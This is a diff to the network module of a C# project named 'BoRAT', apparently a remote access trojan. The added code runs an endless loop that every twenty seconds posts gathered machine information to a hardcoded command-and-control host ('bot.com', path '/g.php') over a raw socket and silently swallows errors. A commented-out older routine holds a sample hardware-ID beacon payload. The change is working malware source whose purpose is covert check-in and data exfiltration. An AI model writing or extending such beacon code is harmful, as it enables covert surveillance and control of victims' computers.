@@ -5,13 +5,24 @@ using System.IO;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
+using System.Threading;
 
 namespace BoRAT.Core.Network
 {
     class Http
     {
-        static string host = "panel.com";
-        public static void Request()
+        const string host = "bot.com";
+
+        internal static void Work()
+        {
+            while (true)
+            {
+                Request(Info.Get());
+                Thread.Sleep(20 * 1000);
+            }
+        }
+
+        public static void Request(string data, string url = "/g.php")
         {
             Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             socket.Connect(host, 80);
@@ -20,12 +31,9 @@ namespace BoRAT.Core.Network
             {
                 try
                 {
-                    // Info user
-                    string data = Info.GetInfo();
-
-                    // Send
+                    // Send request
                     string request = 
-                        "POST / HTTP/1.1\r\n" +
+                        "POST " + url + " HTTP/1.1\r\n" +
                         "Host: " + host + "\r\n" +
                         "Content-Length: " + data.Length + "\r\n\r\n" + 
                         data;
@@ -33,7 +41,9 @@ namespace BoRAT.Core.Network
                     byte[] bytes = Encoding.ASCII.GetBytes(request);
                     socket.Send(bytes, bytes.Length, SocketFlags.None);
 
-                    // Receive
+                    Console.Write("\r\n\r\n========== Request ==========\r\n\r\n" + request);
+
+                    // Receive response
                     byte[] rec = new byte[1024];
                     string response = null;
                     int countBytes;
@@ -45,50 +55,43 @@ namespace BoRAT.Core.Network
 
                     socket.Close();
 
-                    Console.Write(request + "\r\n\r\n");
-                    Console.Write(response);
+                    Console.Write("\r\n\r\n========== Response ==========\r\n\r\n" + response);
                 }
-                catch(Exception ex)
+                catch
                 {
-                    Console.WriteLine(ex.Message);
                 }
             }
 
         }
 
-        public static void DownloadFile(string link)
-        {
+        //public static void Request(string lol)
+        //{
+        //    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(host);
+        //    request.Method = "POST";
+        //    string requestStr = "HWID|1|barbados|Windows 7|32&1&1";
+        //    request.ContentLength = requestStr.Length;
+        //    Stream postStream = request.GetRequestStream();
+        //    byte[] bytes = Encoding.ASCII.GetBytes(requestStr);
+        //    postStream.Write(bytes, 0, bytes.Length);
+        //    HttpWebResponse response = null;
+        //    try
+        //    {
+        //        response = (HttpWebResponse)request.GetResponse();
+        //    }catch(Exception ex)
+        //    {
+        //        Console.Write(ex.Message);
+        //    }
 
-        }
+        //    Console.Write(response.StatusCode.ToString());
 
-        public static void Request(string lol)
-        {
-            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(host);
-            request.Method = "POST";
-            string requestStr = "HWID|1|barbados|Windows 7|32&1&1";
-            request.ContentLength = requestStr.Length;
-            Stream postStream = request.GetRequestStream();
-            byte[] bytes = Encoding.ASCII.GetBytes(requestStr);
-            postStream.Write(bytes, 0, bytes.Length);
-            HttpWebResponse response = null;
-            try
-            {
-                response = (HttpWebResponse)request.GetResponse();
-            }catch(Exception ex)
-            {
-                Console.Write(ex.Message);
-            }
-
-            Console.Write(response.StatusCode.ToString());
-
-            if (response.StatusCode == HttpStatusCode.OK)
-            {
-                Stream stream = response.GetResponseStream();
-                StreamReader reader = new StreamReader(stream);
-                Console.Write(reader.ReadToEnd());
-                reader.Close();
-                stream.Close();
-            }
-        }
+        //    if (response.StatusCode == HttpStatusCode.OK)
+        //    {
+        //        Stream stream = response.GetResponseStream();
+        //        StreamReader reader = new StreamReader(stream);
+        //        Console.Write(reader.ReadToEnd());
+        //        reader.Close();
+        //        stream.Close();
+        //    }
+        //}
     }
 }
